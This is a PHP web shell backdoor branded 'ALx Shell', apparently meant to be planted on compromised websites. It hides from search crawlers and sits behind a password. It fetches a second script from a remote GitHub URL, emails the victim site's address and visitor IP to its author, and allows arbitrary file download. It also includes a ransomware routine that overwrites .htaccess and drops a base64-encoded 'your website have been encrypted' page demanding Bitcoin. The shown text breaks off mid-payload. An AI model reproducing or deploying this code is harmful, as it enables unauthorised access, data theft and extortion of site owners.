<?php
error_reporting(0);
$slf = $_SERVER['PHP_SELF'];
@session_start();
/* PK�J�L404.phpPKPK�J�L404.phpPK57 */
error_reporting(E_ALL^E_NOTICE);
error_reporting(E_ALL);
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
@set_time_limit(0);
@ignore_user_abort(TRUE);
@set_magic_quotes_runtime(0);
@define('VERSION', '3.0');
@clearstatcache();
error_reporting(7);
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];
define('SA_ROOT', str_replace('\\', '/', dirname(__FILE__)).'/');
//define('IS_WIN', strstr(PHP_OS, 'WIN') ? 1 : 0 );
define('IS_WIN', DIRECTORY_SEPARATOR == '\\');
define('IS_COM', class_exists('COM') ? 1 : 0 );
define('IS_GPC', get_magic_quotes_gpc());
$dis_func = get_cfg_var('disable_functions');
define('IS_PHPINFO', (!eregi("phpinfo",$dis_func)) ? 1 : 0 );

$auth_pass = "c32fd5fdb63492c85ffa546fd2c811c8"; // default: ALxWahid
$warn="<center><img src='https://3.bp.blogspot.com/-IpTodLWXERw/XK9YWZO_uvI/AAAAAAAAAvU/LGK0j91Ypl4f74ITUZr6yvushK3xcxM_wCLcBGAs/s1600/black-hatter%2B%25281%2529.jpg' height='1000px' width='667px'/></center><br> <audio autoplay loop > <source src=\"https://archive.org/download/RedAlert_201904/Red%20Alert.mp3\" type=\"audio/mpeg\"></audio>";
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
function login_shell() {
?>
<html>
<!--[if lte IE 6]><html class="preIE7 preIE8 preIE9"><![endif]-->
<!--[if IE 7]><html class="preIE8 preIE9"><![endif]-->
<!--[if IE 8]><html class="preIE9"><![endif]-->
<!--[if gte IE 9]><!--><html><!--<![endif]-->
  <head>
    <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width,initial-scale=1">
<title>Gift from ALx.</title>
 <meta name="author" content="ALx Wahid">
  <meta name="description" content="Shell Backdoor">
  <meta name="keywords" content="PHP, backdoor">
<style type="text/css">
html {
	margin: 20px auto;
	background: #000000;
	color: green;
	text-align: center;
}
<style>
<link href='http://fonts.googleapis.com/css?family=Jolly+Lodger' rel='stylesheet' type='text/css'>
</head>
<body oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;" type="text/css" bgcolor="#010101">
<style type="text/css">
body {
 font-family: 'Jolly Lodger';
 color: white;
 padding: 0;
 margin: 0;
 background-image: url('');
 background-repeat:no-repeat;
 background-position:center;
 background-size: 100% 100%;
}
.ALXploits_Blink {
-webkit-animation-name: blinker;
-webkit-animation-duration: 2s;
-webkit-animation-timing-function: linear;
-webkit-animation-iteration-count: infinite;

-moz-animation-name: blinker;
-moz-animation-duration: 1s;
-moz-animation-timing-function: linear;
-moz-animation-iteration-count: infinite;

 animation-name: blinker;
 animation-duration: 1s;
 animation-timing-function: linear;
 animation-iteration-count: infinite;

 color: red;
}

.name { text-decoration: none;}
@-moz-keyframes roll { 100% { -moz-transform: rotate(360deg); } }
@-o-keyframes roll { 100% { -o-transform: rotate(360deg); } }
@-webkit-keyframes roll { 100% { -webkit-transform: rotate(360deg); } }
img { 
opacity: 0.8; 
} 
img { 
animation-name: rotate ; 
animation-duration: 5s; 
animation-play-state: running; 
animation-timing-function: linear; 
animation-iteration-count: infinite; 
opacity: 1.0; 
filter: alpha(opacity=50);
} 
img:hover {
opacity: 1.0;filter: alpha(opacity=100);
} 
@keyframes rotate{ 
10% {transform:rotateY(36deg)} 
20% {transform:rotateY(72deg)} 
30% {transform:rotateY(108deg)} 
40% {transform:rotateY(144deg)} 
50% {transform:rotateY(180deg)} 
60% {transform:rotateY(216deg)} 
70% {transform:rotateY(252deg)} 
80% {transform:rotateY(288deg)} 
90% {transform:rotateY(324deg)} 
100% {transform:rotateY(360deg)} 
}
</style>
<link rel="SHORTCUT ICON" href="https://2.bp.blogspot.com/-izDNo5tGj8E/We9PRc50i-I/AAAAAAAAAlc/BXguYAaC1nY9wUvxmFiVgebnHmrvHTBJACLcBGAs/s1600/1o6cqx.png" />
<style type="text/css">body {cursor:url("https://3.bp.blogspot.com/-Jl0lTQLFmrk/We-U7scVk7I/AAAAAAAAAm8/eqnQiYKar6ghF4tLSfd2ChYFi9NcEtFQwCLcBGAs/s1600/1508873385104.png"),default}</style>
<script type="text/javascript">
TypingText = function(element, interval, cursor, finishedCallback) {
  if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
    this.running = true;	// Never run.
    return;
  }
  this.element = element;
  this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
  this.interval = (typeof interval == "undefined" ? 30 : interval);
  this.origText = this.element.innerHTML;
  this.unparsedOrigText = this.origText;
  this.cursor = (cursor ? cursor : "");
  this.currentText = "";
  this.currentChar = 0;
  this.element.typingText = this;
  if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
  TypingText.all.push(this);
  this.running = false;
  this.inTag = false;
  this.tagBuffer = "";
  this.inHTMLEntity = false;
  this.HTMLEntityBuffer = "";
}
TypingText.all = new Array();
TypingText.currentIndex = 0;
TypingText.runAll = function() {
  for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
}
TypingText.prototype.run = function() {
  if(this.running) return;
  if(typeof this.origText == "undefined") {
    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);	// We haven't finished loading yet.  Have patience.
    return;
  }
  if(this.currentText == "") this.element.innerHTML = "";
  if(this.currentChar < this.origText.length) {
    if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
      this.tagBuffer = "<";
      this.inTag = true;
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
      this.tagBuffer += ">";
      this.inTag = false;
      this.currentText += this.tagBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inTag) {
      this.tagBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
      this.HTMLEntityBuffer = "&";
      this.inHTMLEntity = true;
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
      this.HTMLEntityBuffer += ";";
      this.inHTMLEntity = false;
      this.currentText += this.HTMLEntityBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inHTMLEntity) {
      this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else {
      this.currentText += this.origText.charAt(this.currentChar);
    }
    this.element.innerHTML = this.currentText;
    this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
    this.currentChar++;
    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
  } else {
	this.currentText = "_";
	this.currentChar = 0;
        this.running = false;
        this.finishedCallback();
  }
}
</script> 
</head>
<br><br><br><br>
<center>
<img src=" https://4.bp.blogspot.com/-o1JRdDVftfc/We6PV9EuNXI/AAAAAAAAAk4/uuwf6piJlLICFWwxKoblwAKKkQNux4D4QCLcBGAs/s1600/ALx%2BW.png " width="370" height="400">
	<div class="ALXploits_Blink">
	<font face="Jolly Lodger" size="4" color="lime">01000001 01001100 01111000</font><br>
   </div>
[<marquee behavior="alternate" scrollamount="50" width="250"> <font size="4" color="red">________<font size="4" color="yellow">________<font size="4" color="#1CFF00">________<font size="4" color="#00A7FF">________</font></font></font></font></marquee>]
<br><b>
<font face="Jolly" size="5" color="WhiteSmoke"> 
If you say this is a game,we also say this is a game,can make clutter on your website is our game,know me by name..!  </font> <br>
</script>
</center>
</html>
<center>
<form method="post">
<input type="password" name="pass" placeholder="fb.com/405.phtml" style="text-align: center">
</form>
	<iframe width="0" height="0" src="https://archive.org/download/HallowedBeMyName/Hallowed%20Be%20My%20Name.mp3" frameborder="0" allowfullscreen</iframe>
<?php 
$fp = fopen("system.php", "w"); 
fwrite($fp, file_get_contents("https://raw.githubusercontent.com/alxwahid/3voScript/master/system.php")); 
fclose($fp); 
?>
<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'alx.wahid@gmail.com, alx.wahid@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<html><head>
<title>ALx Shell.</title>
<meta name='author' content='ALxWahid'>
<meta charset="UTF-8">
<!--- Jquery 2.1.3 --->
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>

<!--- Font Awesome 4.7.0 --->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"/>

<!--- Loader Style --->
<style>
@import url("https://fonts.googleapis.com/css?family=Cabin");
#loading-wrapper {
  position: fixed;
  width: 100%;
  height: 100%;
  left: 0;
  top: 0;
  background:#222;
  z-index: 99999;
}
#loading-text {
  display: block;
  position: absolute;
  top: 50%;
  left: 50%;
  color: green;
  width: 100px;
  height: 30px;
  margin: -8px 0 0 -50px;
  text-align: center;
  font-size: 36px;
}
#loading-content {
  display: block;
  position: fixed;
  left: 50%;
  top: 50%;
  width: 120px;
  height: 120px;
  margin: -55px 0 0 -60px;
  border: 3px solid #F00;
}
#loading-content {
  border: 3px solid transparent;
  border-top-color: #4C8BF4;
  border-bottom-color: #4C8BF4;
  border-radius: 50%;
  -webkit-animation: loader 500ms linear infinite;
  -moz-animation: loader 500ms linear infinite;
  -o-animation: loader 500ms linear infinite;
  animation: loader 500ms linear infinite;
}
@keyframes loader {
  0% {
    -webkit-transform: rotate(0deg);
    -ms-transform: rotate(0deg);
    transform: rotate(0deg);
  }
  100% {
    -webkit-transform: rotate(360deg);
    -ms-transform: rotate(360deg);
    transform: rotate(360deg);
  }
}
</style>

<!--- Javascript Opacity --->
<script>
$(document).ready(function() {
	function pulsate() {
$("#loading-text").animate({ opacity: 0.2 }, 500, 'linear')
 	.animate({ opacity: 1 }, 500, 'linear', pulsate)
	.click(function() {
$(this).animate({ opacity: 1 }, 500, 'linear');
$(this).stop();
	});
}
pulsate();
});
</script>

<!--- Javascript Preloader --->
<script>
	$(window).load(function () {
            $('#loading-wrapper').delay(1000).fadeOut('slow');
         });
  </script>
</head><body>
	
<!--- Run --->
<div id="loading-wrapper">
  <div id="loading-text"><i class="fa fa-gears"></i></div>
  <div id="loading-content"></div>
</div>
	<audio autoplay> <source src="https://archive.org/download/BeepsShort/Beeps%20Short.wav" type="audio/mpeg"></audio>

<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
    background: #000000;
    color: #ffffff;
    font-family: 'Ubuntu';
	font-size: 13px;
	width: 100%;
}
li {
	display: inline;
	margin: 5px;
	padding: 5px;
}
table, th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	background: transparent;
	font-family: 'Ubuntu';
	font-size: 13px;
}
.table_home, .th_home, .td_home {
	border: 1px solid #ffffff;
}
th {
	padding: 10px;
}
a {
	color: #ffffff;
	text-decoration: none;
}
a:hover {
	color: gold;
	text-decoration: underline;
}
b {
	color: gold;
}
input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
textarea {
	border: 1px solid #ffffff;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: 'Ubuntu';
	font-size: 13px;
}
select {
	width: 152px;
	background: #000000; 
	color: blue; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
option:hover {
	background: blue;
	color: #000000;
}
</style>

<style type="text/css">
body {
    background: #008000;
    color: #e2e2e2;
	border-radius:4px;
	box-sizing: border-box;
	border: 25px solid #e20733;
}
.inpute{
    border-style: solid;
    border-color: white;
    background-color: white;
    color: black;
	padding:5px;
    text-align: center;
}
.selecte{
    border-style: solid;
	padding:6px;
    border-color:white;
    background-color: #ff751a;
    color: black;
}
.submite{
    border-style: solid;
    border-color: #4CAF50;
    background-color: transparent;
    color: white;
	padding:6px;
}
.result{
  text-align: left;
}

#isi {
	background-color:#008000;
	padding-top:50px;
	text-align:center;
	
}

#gerak {
	
	padding-left:25%;
	padding-right:25%;
	color:#ffff66;
	
}
</style>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">

<link rel="SHORTCUT ICON" href="https://2.bp.blogspot.com/-izDNo5tGj8E/We9PRc50i-I/AAAAAAAAAlc/BXguYAaC1nY9wUvxmFiVgebnHmrvHTBJACLcBGAs/s1600/1o6cqx.png" />

<style type="text/css">body {cursor:url("https://3.bp.blogspot.com/-Jl0lTQLFmrk/We-U7scVk7I/AAAAAAAAAm8/eqnQiYKar6ghF4tLSfd2ChYFi9NcEtFQwCLcBGAs/s1600/1508873385104.png"),default}</style> 
</head>
<body>
<div class="result">
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
class deRanSomeware
{
   public function shcpackInstall(){
    if(!file_exists(".htaALx")){
      rename(".htaccess");
      if(fwrite(fopen('.htaccess', 'w'), "#ALxWare \r\nDirectoryIndex index.php\r\nErrorDocument 404 /index.php")){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
      }
      if(file_put_contents("index.php", base64_decode("PGh0bWw+CjwhLS1baWYgbHRlIElFIDZdPjxodG1sIGNsYXNzPSJwcmVJRTcgcHJlSUU4IHByZUlFOSI+PCFbZW5kaWZdLS0+CjwhLS1baWYgSUUgN10+PGh0bWwgY2xhc3M9InByZUlFOCBwcmVJRTkiPjwhW2VuZGlmXS0tPgo8IS0tW2lmIElFIDhdPjxodG1sIGNsYXNzPSJwcmVJRTkiPjwhW2VuZGlmXS0tPgo8IS0tW2lmIGd0ZSBJRSA5XT48IS0tPjxodG1sPjwhLS08IVtlbmRpZl0tLT4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UsY2hyb21lPTEiPgogIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsaW5pdGlhbC1zY2FsZT0xIj4KPHRpdGxlPlNjYW4gUVIgY29kZS48L3RpdGxlPgogPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJBTHggV2FoaWQiPgogIDxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJXZWJzaXRlIEVuY3J5cHRlZCI+CiAgPG1ldGEgbmFtZT0ia2V5d29yZHMiIGNvbnRlbnQ9IkhUTUwsIGVuY3J5cHRlZCI+CjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+CgphIHsKCWNvbG9yOiM4MDgwZmY7Cn0KI2tpcmkgewoJZmxvYXQ6bGVmdDsKCQoJCQp9Cgoja2lyaS1nYW1iYXIgewoJcGFkZGluZy1sZWZ0OjMwcHg7CglwYWRkaW5nLXRvcDozMHB4Owp9CiNpc2kgewoJCXBhZGRpbmctbGVmdDo1MHB4Owp9CgojaXNpLWNvbnRlbnQgewoJYmFja2dyb3VuZC1jb2xvcjp3aGl0ZTsKCXdpZHRoOjY1JTsKCWZvbnQtc2l6ZToyMHB4OwoJdGV4dC1hbGlnbjpsZWZ0OwoJbWFyZ2luLWxlZnQ6MzAlOwoJcGFkZGluZy1sZWZ0OjNweDsKCXBhZGRpbmctdG9wOjNweDsKCXBhZGRpbmctcmlnaHQ6M3B4OwoJcGFkZGluZy1ib3R0b206M3B4Owp9CgojaXNpLWp1ZHVsIHsKCWZvbnQtc2l6ZTo0MHB4OwoJY29sb3I6d2hpdGU7CglwYWRkaW5nLXJpZ2h0OjI1MHB4OwoJdGV4dC1hbGlnbjpjZW50ZXI7CgkKCQp9CgojaXNpLXdpbmRvdyB7Cgl0ZXh0LWFsaWduOmxlZnQ7CgkJCn0KCiNpc2ktZ2FtYmFyIHsKCW1hcmdpbi1sZWZ0OjMwJTsKCQkKCQp9CgojaXNpLWtvbG9tIHsKCWZsb2F0OmxlZnQ7CglwYWRkaW5nLWxlZnQ6MzBweDsKCWZvbnQtc2l6ZToyMHB4OwoJY29sb3I6d2hpdGU7CgkKCQp9CgppbnB1dFt0eXBlPXRleHRdLCBzZWxlY3QgewoJd2lkdGg6IDQwMHB4OwoJbWFyZ2luOiA4cHggMDsKCXBhZGRpbmc6IDE0cHggMjBweDsKICAgIAogICAgYm9yZGVyOiAxcHggc29saWQgI2NjYzsKICAgIGJvcmRlci1yYWRpdXM6IDRweDsKICAgIGJveC1zaXppbmc6IGJvcmRlci1ib3g7Cn0KCmJ1dHRvbiB7CiAgICB3aWR0aDogMjAwcHg7CiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjNENBRjUwOwogICAgY29sb3I6IHdoaXRlOwogICAgcGFkZGluZzogMTZweCAyMHB4OwogICAgbWFyZ2luOiA4cHggMDsKICAgIGJvcmRlcjogbm9uZTsKICAgIGJvcmRlci1yYWRpdXM6IDRweDsKICAgIGN1cnNvcjogcG9pbnRlcjsKfQoJCiNzaXNhLXdha3R1IHsKCWZvbnQtZmFtaWx5OiJQYWxhdGlubyBMaW5vdHlwZSIsICJCb29rIEFudGlxdWEiLCBQYWxhdGlubywgc2VyaWY7Cglmb250LXNpemU6MzBweDsKCXBhZGRpbmctbGVmdDozMHB4OwoJcGFkZGluZy10b3A6MzBweDsKCWFuaW1hdGlvbjogYmxpbmstYW5pbWF0aW9uIDFzIHN0ZXBzKDUsIHN0YXJ0KSBpbmZpbml0ZTsKCS13ZWJraXQtYW5pbWF0aW9uOiBibGluay1hbmltYXRpb24gMXMgc3RlcHMoNSwgc3RhcnQpIGluZmluaXRlOwoJCn0JCgojaGFja2VkIHsKCQlwYWRkaW5nLXRvcDoxMTVweDsKCQlmb250LWZhbWlseToiUGFsYXRpbm8gTGlub3R5cGUiLCAiQm9vayBBbnRpcXVhIiwgUGFsYXRpbm8sIHNlcmlmOwoJCWNvbG9yOndoaXRlOwoJCXdpZHRoOjI1JTsKCQkKCQkKfQpAa2V5ZnJhbWVzIGJsaW5rLWFuaW1hdGlvbiB7CiAgdG8gewogICAgdmlzaWJpbGl0eTogaGlkZGVuOwogIH0KfQpALXdlYmtpdC1rZXlmcmFtZXMgYmxpbmstYW5pbWF0aW9uIHsKICB0byB7CiAgICB2aXNpYmlsaXR5OiBoaWRkZW47CiAgfQp9CgojdGltZXIgewoJZm9udC1mYW1pbHk6IlBhbGF0aW5vIExpbm90eXBlIiwgIkJvb2sgQW50aXF1YSIsIFBhbGF0aW5vLCBzZXJpZjsKCWZvbnQtc2l6ZToyNXB4OwoJcGFkZGluZy1sZWZ0OjMwcHg7CglwYWRkaW5nLXRvcDpub25lOwoJY29sb3I6d2hpdGU7Cn0KCiN3YWt0dSB7Cglib3JkZXI6M3B4OwoJY29sb3I6d2hpdGU7Cn0JCgojYWJvdXQgewoJZm9udC1mYW1pbHk6IlBhbGF0aW5vIExpbm90eXBlIiwgIkJvb2sgQW50aXF1YSIsIFBhbGF0aW5vLCBzZXJpZjsKCWZvbnQtc2l6ZToyMHB4OwoJcGFkZGluZy1sZWZ0OjMwcHg7CglwYWRkaW5nLXRvcDoxMDBweDsKfQkKCiNjb3VudGRvd24gewoJZm9udC1mYW1pbHk6IHNhbnMtc2VyaWY7Cgljb2xvcjogI2ZmZjsKCWRpc3BsYXk6IGlubGluZS1ibG9jazsKCXRleHQtYWxpZ246IGNlbnRlcjsKCWZvbnQtc2l6ZTogMzBweDsKCWJhY2tncm91bmQ6ICNmZjY2MDA7Cglmb250LXdlaWdodDogMTAwOwoJd2lkdGg6MTAwJTsKfQkKPC9zdHlsZT4KPC9oZWFkPgo8aGVhZD4KPGxpbmsgcmVsPSJTSE9SVENVVCBJQ09OIiBocmVmPSJodHRwczovLzMuYnAuYmxvZ3Nwb3QuY29tLy1iOU90dzJZQjVIRS9XZTh0TXl0ZzlrSS9BQUFBQUFBQUFsSS9xcmFIaTRjMnRuMC1ib2kxSmVvOW5qLW15dDZWUng2QVFDTGNCR0FzL3MxNjAwL0FMeCUyQlcuaWNvIiAvPgoKPHN0eWxlIHR5cGU9InRleHQvY3NzIj5ib2R5IHtjdXJzb3I6dXJsKCJodHRwczovLzMuYnAuYmxvZ3Nwb3QuY29tLy1KbDBsVFFMRm1yay9XZS1VN3NjVms3SS9BQUFBQUFBQUFtOC9lcW5RaVlLYXI2Z2hGNHRMU2ZkMkNoWUZpOU5jRXRGUXdDTGNCR0FzL3MxNjAwLzE1MDg4NzMzODUxMDQucG5nIiksZGVmYXVsdH08L3N0eWxlPiAKPC9oZWFkPgo8Ym9keSBzdHlsZT0iYmFja2dyb3VuZDojOTkwMDAwO2JvcmRlcjogMjVweCBzb2xpZCAjZTIwNzMzO2JvcmRlci1yYWRpdXM6NHB4O2JveC1zaXppbmc6IGJvcmRlci1ib3g7Ij4KCTxkaXYgaWQ9ImtpcmkiPgoJPGRpdiBpZD0ia2lyaS1nYW1iYXIiPjxpbWcgc3JjPSJodHRwczovLzIuYnAuYmxvZ3Nwb3QuY29tLy1rQzY2MS0xNlRMcy9XZEtrNUtPdWVtSS9BQUFBQUFBQUFqOC8tZ2pVU2Fmb0lrNE05SUZxdGpsbk1XWWlDZEl5R0JPNWdDTGNCR0FzL3MxNjAwL0FMeFBhZGxvY2suZ2lmIiBoZWlnaHQ9IjIwMHB4IiB3aWR0aD0iMjAwcHgiPjwvZGl2PgoJPHNjcmlwdCB0eXBlID0gInRleHQvamF2YXNjcmlwdCI+CgkJdmFyIGNkYXk7CgkJdmFyIHRpbWVJblNlY3M7CgkJdmFyIHRpY2tlcjsKCgkJZnVuY3Rpb24gZ2V0U2Vjb25kcygpIHsKCQl2YXIgbm93ID0gbmV3IERhdGUoKTsKCQl2YXIgbm93dGltZT0gbm93LmdldFRpbWUoKTsgIC8vIHRpbWUgbm93IGluIG1pbGxpc2Vjb25kcwoJCXZhciBjb3VudGRvd250aW1lID0gbmV3IERhdGUobm93LmdldEZ1bGxZZWFyKCksbm93LmdldE1vbnRoKCksbm93LmdldERhdGUoKSwyMCwwLDApOyAvLyAgMTYgaHJzID0gNCBwbQoJCS8vIGNvdW50ZG93bnRpbWUgLSBjaGFuZ2UgdGltZSBoaCxtbSxzcyB0byB3aGF0ZXZlciB0aW1lIHJlcXVpcmVkLCBlLmcuIDcsNTAsMCAoMDc1MCkKCgkJdmFyIGR5ID0gNSA7IC8vIEZyaWRheSAoZGF5IDUpIC0gY2hhbmdlIGZvciBvdGhlciBkYXlzIDAtNgoJCXZhciBhdGltZSA9IGNvdW50ZG93bnRpbWUuZ2V0VGltZSgpOwoJCXZhciBkaWZmID0gcGFyc2VJbnQoKGF0aW1lIC0gbm93dGltZSkvMTAwMCk7ICAvLyBwb3NpdGl2ZSBpZiBkYXRlIGlzIGluIGZ1dHVyZQoJCWlmIChkaWZmID4wKSB7CgkJY2RheSA9IGR5IC0gbm93LmdldERheSgpOyAgICAgCgkJfQoJCWVsc2UgewoJY2RheSA9ICBkeSAtIG5vdy5nZXREYXkoKSAtMTsKCQl9CgkJaWYgKGNkYXkgPCAwKSB7IGNkYXkgKz0gNzsgfSAgIC8vIGFsZWFkeSBwYXNzZWQgY291bnRkb3duIHRpbWUsIHNvIGdvIGZvciBuZXh0IHdlZWsKCQlpZiAoZGlmZiA8PSAwKSB7IGRpZmYgKz0gKDg2NDAwICogNykgfQoJCXN0YXJ0VGltZXIgKGRpZmYpOwoJCX0KCgkJZnVuY3Rpb24gc3RhcnRUaW1lcihzZWNzKSB7CgkJdGltZUluU2VjcyA9IHBhcnNlSW50KHNlY3MpOwoJdGlja2VyID0gc2V0SW50ZXJ2YWwoInRpY2soKSIsMTAwMCk7CgkJdGljaygpOyAvLyB0byBzdGFydCBjb3VudGVyIGRpc3BsYXkgcmlnaHQgYXdheQoJCX0KCgkJZnVuY3Rpb24gdGljaygpIHsKCQl2YXIgc2VjcyA9IHRpbWVJblNlY3M7CgkJaWYgKHNlY3M+MCkgICB7CgkJdGltZUluU2Vjcy0tOwoJCX0KCQllbHNlIHsKCQljbGVhckludGVydmFsKHRpY2tlcik7IC8vIHN0b3AgY291bnRpbmcgYXQgemVybwoJCWdldFNlY29uZHMoKTsgIC8vIGFuZCBzdGFydCBhbGwgb3ZlciBhZ2FpbiEKCQl9CgoJCXZhciBkYXlzID0gTWF0aC5mbG9vcihzZWNzLzg2NDAwKTsKCQlzZWNzICU9IDg2NDAwOwoJCXZhciBob3Vycz0gTWF0aC5mbG9vcihzZWNzLzM2MDApOwoJCXNlY3MgJT0gMzYwMDsKCQl2YXIgbWlucyA9IE1hdGguZmxvb3Ioc2Vjcy82MCk7CgkJc2VjcyAlPSA2MDsKCQl2YXIgcmVzdWx0ID0gZGF5cyArIjoiOwoJCXJlc3VsdCArPSAoKGhvdXJzIDwgMTAgKSA/ICIwIjoiIiApICsgaG91cnMgKyAiOiIgKyAoIChtaW5zIDwgMTApID8gIjAiIDogIiIgKSArIG1pbnMKCQkrICI6IiArICggKHNlY3MgPCAxMCkgPyAiMCI6IiIgKSArIHNlY3MgKyAiIjsKCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY291bnRkb3duIikuaW5uZXJIVE1MID0gIHJlc3VsdDsKCQl9CgkJPC9zY3JpcHQ+CgkJPGRpdiBpZD0id2FrdHUiPgoJCQkJPGRpdiBpZD0ic2lzYS13YWt0dSI+CgkJCQlBbGwgZmlsZXMgd2lsbCBiZSBkZWxldGUgb24gOgoJCQkJPC9kaXY+CgkJCQk8ZGl2IGlkPSJ0aW1lciI+CgkJCQkJPGJvZHkgb25sb2FkID0gImdldFNlY29uZHMoKSI+ICAgCgkJCQkJCTxkaXYgaWQ9IkNvdW50RG93bkxvZ28iPgoJCQkJCQkJPHNwYW4gaWQ9InRpdGxlIjwvc3Bhbj4KCQkJCQkJCTxicj48YnI+CgkJCQkJCQk8c3BhbiBpZD0iY291bnRkb3duIj4gPC9zcGFuPiAgICAgICAgCgkJCQkJCTwvZGl2PiAKCQkJCTwvZGl2PgkJCgkJPC9kaXY+CgoJCTxkaXYgaWQ9ImFib3V0Ij4KCQk8YSBocmVmPSJodHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9CaXRjb2luIiB0YXJnZXQ9Il9ibGFuayI+QWJvdXQgQml0Q29pbjwvYT48YnI+PGJyPgoJCTxhIGhyZWY9Imh0dHBzOi8vd3d3LmJpdGNvaW4uY29tL2J1eS1iaXRjb2luIiB0YXJnZXQ9Il9ibGFuayI+SG93IHRvIGJ1eSBCaXRDb2luID88L2E+PGJyPjxicj4KCQk8YSBocmVmPSJtYWlsdG86YWx4LndhaGlkQGdtYWlsLmNvbSI+PGI+Q29udGFjdCBVczwvYj48L2E+CgkJPC9kaXY+Cgk8L2Rpdj4KPGRpdiBpZD0iaXNpIj4JCjxicj4KPGJyPgkJCQoJPGRpdiBpZD0iaXNpLWp1ZHVsIj5Pb29wcywgeW91ciB3ZWJzaXRlIGhhdmUgYmVlbiBlbmNyeXB0ZWQhPC9kaXY+Cgk8YnI+Cgk8YnI+Cgk8ZGl2IGlkPSJpc2ktY29udGVudCI+CgkJPGRpdiBpZD0iY29udGVudC1qdWR1bCI+CgkJPHU+PGI+V2hhdCBoYXBwZW5lZCB0byBteSB3ZWJzaXRlID88L3U+PC9iPjwvc3R5bGU+PGJyPgoJCTwvZGl2PgoJCVlvdXIgaW1wb3J0YW50IHdlYnNpdGUgZmlsZXMgYXJlIGVuY3J5cHRlZC4KCQlNYW55IG9mIHlvdXIgLnBocCwgLmNzcywgLmpzLCBhbmQgb3RoZXIgZmlsZXMgYXJlIG5vIGxvbmdlciBhY